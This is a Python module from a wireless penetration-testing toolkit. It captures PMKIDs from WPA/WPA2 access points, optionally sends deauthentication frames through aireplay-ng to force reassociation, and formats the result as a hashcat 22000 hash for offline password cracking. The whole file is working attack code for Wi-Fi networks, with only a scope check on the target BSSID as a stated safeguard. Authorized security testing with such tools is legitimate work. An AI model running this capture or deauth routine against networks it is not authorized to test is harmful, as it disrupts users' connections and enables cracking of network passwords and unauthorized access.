# SPDX-License-Identifier: GPL-3.0-or-later
# Copyright (c) 2025 Nerds489
"""Clientless PMKID capture for WPA/WPA2-PSK access points.

The PMKID rides in the access point's EAPOL message 1, so it can be collected
without a connected client and without the full 4-way handshake. This composes
the gated airodump-ng adapter (channel-locked pcap capture) with the native
parser in :mod:`netreaper.wireless.eapol`, then emits a hashcat 22000 (WPA*01)
hash line ready to crack.

Every process spawn still passes the adapters' scope gate: the capture is
PASSIVE and gated on the target BSSID; an optional deauth (to prompt a client to
reassociate, whose association draws message 1 from the AP) is DESTRUCTIVE and
gated. A scope-gate denial is torn down and propagated, never swallowed.
"""
from __future__ import annotations

import asyncio
import contextlib
import shutil
import tempfile
from dataclasses import dataclass
from pathlib import Path

from netreaper.core.logging import get_logger
from netreaper.orchestration.events import Events, event_bus
from netreaper.tools.aireplay import AireplayTool
from netreaper.tools.airodump import AirodumpTool
from netreaper.wireless.eapol import Pmkid, pmkids_for

logger = get_logger(__name__)


def hashcat_22000_line(pmkid_hex: str, ap_mac: str, sta_mac: str, essid: str) -> str:
    """Format a hashcat 22000 PMKID (WPA*01) hash line."""
    ap = ap_mac.replace(":", "").replace("-", "").lower()
    sta = sta_mac.replace(":", "").replace("-", "").lower()
    essid_hex = essid.encode("utf-8", "surrogatepass").hex()
    return f"WPA*01*{pmkid_hex.lower()}*{ap}*{sta}*{essid_hex}***"


@dataclass
class PmkidResult:
    bssid: str
    channel: int
    essid: str = ""
    captured: bool = False
    cap_file: str | None = None
    client: str | None = None
    pmkid: str | None = None
    hashcat: str | None = None
    deauth_packets: int = 0
    attempts: int = 0


class PmkidCapture:
    """Capture a PMKID for a single access point and format it for hashcat."""

    def __init__(
        self,
        airodump: AirodumpTool | None = None,
        aireplay: AireplayTool | None = None,
    ) -> None:
        self._airodump = airodump or AirodumpTool()
        self._aireplay = aireplay or AireplayTool()

    async def capture(
        self,
        interface: str,
        bssid: str,
        channel: int,
        *,
        essid: str = "",
        client: str | None = None,
        output: str | None = None,
        capture_seconds: int = 20,
        deauth_count: int = 0,
        max_attempts: int = 3,
        settle_seconds: int = 3,
    ) -> PmkidResult:
        """Capture a PMKID, retrying until one is extracted or attempts run out.

        Args:
            interface: Monitor-mode interface.
            bssid: Target access point BSSID (the scope-checked identifier).
            channel: Target channel to lock onto.
            essid: Network name, used to build the hashcat line.
            client: Optional client to deauth (to draw a fresh association).
            output: .cap prefix; a temp file is used when omitted.
            capture_seconds: Listen window per attempt.
            deauth_count: Deauth frames per attempt (0 keeps it fully passive).
            max_attempts: Capture rounds before giving up.
            settle_seconds: Delay before deauth so airodump is on-channel first.
        """
        prefix, cleanup = self._resolve_prefix(output)
        result = PmkidResult(bssid=bssid, channel=channel, essid=essid)
        try:
            for attempt in range(1, max_attempts + 1):
                result.attempts = attempt
                cap_path = await self._one_attempt(
                    interface, bssid, channel, client, prefix,
                    capture_seconds, deauth_count, settle_seconds, result,
                )
                found = self._verify(cap_path, bssid)
                if found is not None:
                    result.captured = True
                    result.cap_file = str(cap_path)
                    result.client = found.client
                    result.pmkid = found.pmkid
                    result.hashcat = hashcat_22000_line(
                        found.pmkid, bssid, found.client, essid
                    )
                    event_bus.emit(
                        Events.PMKID_CAPTURED,
                        {
                            "bssid": bssid,
                            "client": found.client,
                            "channel": channel,
                            "pmkid": found.pmkid,
                            "cap_file": str(cap_path),
                        },
                    )
                    logger.info("PMKID captured for %s (attempt %d)", bssid, attempt)
                    return result
                logger.info("No PMKID for %s (%d/%d)", bssid, attempt, max_attempts)
            return result
        finally:
            cleanup()

    async def _one_attempt(
        self,
        interface: str,
        bssid: str,
        channel: int,
        client: str | None,
        prefix: str,
        capture_seconds: int,
        deauth_count: int,
        settle_seconds: int,
        result: PmkidResult,
    ) -> Path:
        """Run one capture window (optionally deauth-assisted). Returns cap path."""
        cap_task = asyncio.create_task(
            self._airodump.capture_for_target(
                interface, bssid, channel, prefix, duration=capture_seconds
            )
        )
        try:
            if deauth_count > 0:
                await asyncio.sleep(min(settle_seconds, max(0, capture_seconds - 1)))
                data = await self._aireplay.deauth_attack(
                    interface, bssid, client=client, count=deauth_count
                )
                result.deauth_packets += int(data.get("packets_sent", deauth_count))
            await cap_task
        except BaseException:
            # Tear the capture down on any failure. A scope-gate denial
            # (TargetValidationError) propagates unchanged: it is never swallowed.
            cap_task.cancel()
            with contextlib.suppress(asyncio.CancelledError):
                await cap_task
            raise
        return Path(f"{prefix}-01.cap")

    @staticmethod
    def _verify(cap_path: Path, bssid: str) -> Pmkid | None:
        """Return the first PMKID for bssid in the cap, else None."""
        if not cap_path.exists():
            return None
        found = pmkids_for(cap_path, bssid)
        return found[0] if found else None

    @staticmethod
    def _resolve_prefix(output: str | None):
        """Return (prefix, cleanup). A temp dir is created when output is None."""
        if output:
            return output, lambda: None
        tmp = tempfile.mkdtemp(prefix="netreaper_pmkid_")
        prefix = str(Path(tmp) / "pmkid")

        def cleanup() -> None:
            shutil.rmtree(tmp, ignore_errors=True)

        return prefix, cleanup


async def capture_pmkid(
    interface: str,
    bssid: str,
    channel: int,
    *,
    essid: str = "",
    client: str | None = None,
    output: str | None = None,
    capture_seconds: int = 20,
    deauth_count: int = 0,
    max_attempts: int = 3,
) -> PmkidResult:
    """Stateless one-shot PMKID capture for the CLI."""
    return await PmkidCapture().capture(
        interface,
        bssid,
        channel,
        essid=essid,
        client=client,
        output=output,
        capture_seconds=capture_seconds,
        deauth_count=deauth_count,
        max_attempts=max_attempts,
    )
